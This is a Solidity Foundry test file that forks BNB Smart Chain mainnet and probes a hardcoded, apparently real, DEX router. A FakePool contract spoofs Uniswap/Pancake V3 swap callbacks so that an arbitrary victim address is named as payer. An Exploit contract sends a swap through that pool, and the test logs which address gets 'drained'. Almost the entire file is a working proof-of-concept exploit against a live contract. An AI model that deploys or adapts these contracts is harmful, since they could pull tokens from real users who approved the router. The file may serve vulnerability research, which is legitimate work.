// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

address constant ROUTER = 0xa331fde028e6F17425AB9333c39ae43722340d24;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
bytes4 constant SWAP_SELECTOR = 0x33411b5e;

struct Route {
    uint256 kind;
    address tokenIn;
    address tokenOut;
    address pool;
    uint256 fee;
    uint256 a;
    uint256 b;
    bytes data;
}
struct PayInfo {
    bytes path;
    address payer;
    address recipient;
    uint256 amount;
}
interface IRouter {
    function factoryV3() external view returns (address);
    function uniswapV3SwapCallback(int256, int256, bytes calldata) external;
    function pancakeV3SwapCallback(int256, int256, bytes calldata) external;
}

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] < a) return false; // avoid panic; report failure
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

contract FakePool {
    address public owner;
    address public payerFromData; // what the fake pool NAMES as payer in callback data
    address public tokenIn;
    uint256 public amount;
    uint8 public mode;
    constructor() { owner = msg.sender; }
    function arm(address p, address t, uint256 a, uint8 m) external {
        require(msg.sender == owner, "own");
        payerFromData = p; tokenIn = t; amount = a; mode = m;
    }
    function swap(address, bool zeroForOne, int256, uint160, bytes calldata) external returns (int256, int256) {
        bytes memory path = abi.encodePacked(tokenIn, uint24(10000), WBNB);
        PayInfo memory info = PayInfo({path: path, payer: payerFromData, recipient: owner, amount: amount});
        (int256 a0, int256 a1) = zeroForOne ? (int256(amount), int256(-1)) : (int256(-1), int256(amount));
        if (mode == 0) IRouter(msg.sender).uniswapV3SwapCallback(a0, a1, abi.encode(info));
        else IRouter(msg.sender).pancakeV3SwapCallback(a0, a1, abi.encode(info));
        uint256 b = MockToken(tokenIn).balanceOf(address(this));
        if (b > 0) MockToken(tokenIn).transfer(owner, b);
        return (a0, a1);
    }
}

contract Exploit {
    address public pool;
    constructor() { pool = address(new FakePool()); }
    function arm(address p, address token, uint256 amountIn, uint8 mode) external { FakePool(pool).arm(p, token, amountIn, mode); }
    function fire(address token, uint256 amountIn, address recipient) external returns (bool ok, bytes memory ret) {
        Route[] memory routes = new Route[](1);
        routes[0] = Route(1, token, WBNB, pool, 10000, 0, 0, "");
        (ok, ret) = ROUTER.call(abi.encodeWithSelector(
            SWAP_SELECTOR, routes, amountIn, uint256(0), uint256(0), uint256(0), recipient, bytes("")));
    }
}

contract RouterProbe is Test {
    MockToken tok;
    Exploit exp;
    address victim = address(0xBEEF01);      // named as payer inside the fake pool's callback data
    address callerRecipient = address(0xCA11E2); // entry msg.sender AND entry recipient

    function setUp() public {
        uint256 fb = vm.envOr("FORK_BLOCK", uint256(0));
        if (fb == 0) vm.createSelectFork("https://bsc-rpc.publicnode.com");
        else vm.createSelectFork("https://bsc-rpc.publicnode.com", fb);
        tok = new MockToken();
        exp = new Exploit();
    }

    function _prep(uint8 mode) internal returns (uint256 victimBefore, uint256 crBefore) {
        address poolAddr = exp.pool();
        tok.mint(victim, 1000e18);
        vm.prank(victim); tok.approve(ROUTER, type(uint256).max);
        vm.prank(victim); tok.approve(poolAddr, type(uint256).max);
        tok.mint(callerRecipient, 1000e18);
        vm.prank(callerRecipient); tok.approve(ROUTER, type(uint256).max);
        vm.prank(callerRecipient); tok.approve(poolAddr, type(uint256).max);
        tok.mint(address(exp), 10e18);
        vm.prank(address(exp)); tok.approve(ROUTER, type(uint256).max);
        exp.arm(victim, address(tok), 5e18, mode);
        victimBefore = tok.balanceOf(victim);
        crBefore = tok.balanceOf(callerRecipient);
    }

    function testWhoIsDrained() public {
        emit log_named_address("impl", _impl());
        emit log_named_address("factoryV3", IRouter(ROUTER).factoryV3());

        for (uint8 m = 0; m < 2; m++) {
            (uint256 vb, uint256 cb) = _prep(m);
            uint256 eb = tok.balanceOf(address(exp));
            // recipient passed to the entry = callerRecipient (a distinct address from the victim)
            (bool ok, bytes memory ret) = exp.fire(address(tok), 5e18, callerRecipient);
            uint256 va = tok.balanceOf(victim);
            uint256 ca = tok.balanceOf(callerRecipient);
            uint256 ea = tok.balanceOf(address(exp));
            emit log_named_uint("mode", m);
            emit log_named_string("entry ok", ok ? "YES" : "no");
            emit log_named_uint("victim drained", vb > va ? vb - va : 0);
            emit log_named_uint("callerRecipient drained", cb > ca ? cb - ca : 0);
            emit log_named_uint("ATTACKER(caller) drained", eb > ea ? eb - ea : 0);
            if (!ok && ret.length > 4) emit log_named_bytes("ret", ret);
        }
    }

    function _impl() internal view returns (address) {
        bytes32 s = vm.load(ROUTER, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        return address(uint160(uint256(s)));
    }
}
